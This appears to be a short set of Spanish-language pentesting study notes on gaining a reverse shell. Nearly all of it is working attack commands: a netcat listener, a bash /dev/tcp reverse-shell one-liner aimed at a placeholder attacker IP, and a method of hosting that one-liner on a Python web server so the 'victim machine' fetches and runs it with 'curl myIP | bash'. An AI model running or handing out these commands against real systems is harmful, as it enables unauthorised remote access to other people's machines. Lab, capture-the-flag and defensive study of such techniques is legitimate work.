- Vamos a ponernos por escucha por el puerto que queramos:

	`sudo nc -nlvp port`

Para ganar acceso remoto, hay un método que a veces funciona, y a veces no. Se pone el consola de comandos directamente:

> `bash -i >& /dev/tcp/myIP/activePort 0>&1`

En vez de hacer esto (porque a veces no funciona), nos creamos un servidor web en el que subir un archivo con este código, el cuál se pipeará con bash para que se ejecute:

1. El fichero empezará así:

`#!/bin/bash`
`bash -i >& /dev/tcp/myIP/activePort 0>&1`

2. Nos montamos el servidor web con python.

3. Nos ponemos por escucha por el activePort:

`sudo nc -nlvp activePort`

4. Si en la máquina víctima ejecutamos:

`curl myIP | bash`

Aquí le decimos que nos baje ese archivo, y que nos lo interprete con bash.